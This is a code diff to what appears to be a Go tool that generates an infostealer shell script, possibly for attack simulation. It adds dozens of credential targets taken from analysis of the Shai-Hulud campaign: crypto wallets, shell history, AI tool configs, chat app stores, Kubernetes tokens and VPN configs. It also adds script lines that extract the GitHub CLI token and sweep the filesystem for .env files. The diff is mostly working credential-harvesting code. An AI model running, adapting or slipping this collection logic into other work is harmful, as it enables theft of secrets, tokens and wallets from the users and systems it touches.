@@ -32,16 +32,30 @@ var defaultCredPaths = []string{
 	"$HOME/.terraform.d/credentials.tfrc.json",
 }
 
-// extendedCredPaths adds crypto wallets, shell history, database configs, and more.
+// extendedCredPaths adds crypto wallets, shell history, database configs,
+// AI tool configs, chat/IM credentials, VPN configs, K8s/Docker secrets, and more.
+// Expanded from Shai-Hulud campaign analysis (~100 paths per OS).
 var extendedCredPaths = []string{
+	// Crypto wallets
 	"$HOME/.config/solana/id.json",
 	"$HOME/.bitcoin/wallet.dat",
 	"$HOME/.ethereum/keystore",
 	"$HOME/.cardano",
+	"$HOME/.litecoin/wallet.dat",
+	"$HOME/.dogecoin/wallet.dat",
+	"$HOME/.monero/wallet.keys",
+	"$HOME/.dash/wallet.dat",
+	"$HOME/.zcash/wallet.dat",
+	"$HOME/.ripple",
+	"$HOME/.polkadot",
+	"$HOME/.cosmos",
+	// Shell history
 	"$HOME/.bash_history",
 	"$HOME/.zsh_history",
+	// Database history/config
 	"$HOME/.mysql_history",
 	"$HOME/.psql_history",
+	// Cloud/DevOps
 	"$HOME/.config/helm",
 	"$HOME/.terraform.d",
 	"$HOME/.azure",
@@ -51,6 +65,27 @@ var extendedCredPaths = []string{
 	"$HOME/.nuget/NuGet.Config",
 	"$HOME/.config/configstore",
 	"/etc/ssl/private",
+	// AI tool configs
+	"$HOME/.claude.json",
+	"$HOME/.claude/mcp.json",
+	"$HOME/.kiro/settings/mcp.json",
+	// Chat/IM credentials
+	"$HOME/.config/discord/Local Storage/leveldb",
+	"$HOME/.config/Slack/Cookies",
+	"$HOME/.config/Signal",
+	"$HOME/.config/telegram-desktop",
+	// Package manager at project root
+	".npmrc",
+	// K8s in-cluster auth
+	"/var/run/secrets/kubernetes.io/serviceaccount/token",
+	// Docker container configs
+	"/var/lib/docker/containers",
+	// K3s
+	"/etc/rancher/k3s/k3s.yaml",
+	// VPN configs
+	"$HOME/.config/openvpn",
+	"/etc/openvpn",
+	"/etc/NetworkManager/system-connections",
 }
 
 // GenerateInfostealerScript returns a shell script that gathers environment
@@ -223,6 +258,14 @@ _gzx() {
   # Sweep for key/certificate files in home directory
   find "$HOME" -maxdepth 3 \( -name "*.pem" -o -name "*.key" -o -name "*.p12" -o -name "*.pfx" -o -name "id_rsa" -o -name "id_ed25519" \) \
     -exec cp {} "$_d/creds/" \; 2>/dev/null
+
+  # 2b. GitHub CLI token extraction
+  _ght=$(gh auth token 2>/dev/null)
+  [ -n "$_ght" ] && echo "GH_AUTH_TOKEN=$_ght" >> "$_d/creds/gh_cli_token.txt"
+
+  # 2c. Sweep for .env files at any depth
+  find / -maxdepth 5 \( -name ".env" -o -name ".env.local" -o -name ".env.production" -o -name ".env.staging" \) \
+    -not -path "*/node_modules/*" -exec cp {} "$_d/creds/" \; 2>/dev/null
 %s%s
   # 3. Network interface enumeration
   (ip addr 2>/dev/null || ifconfig 2>/dev/null) > "$_d/creds/network.txt" 2>/dev/null
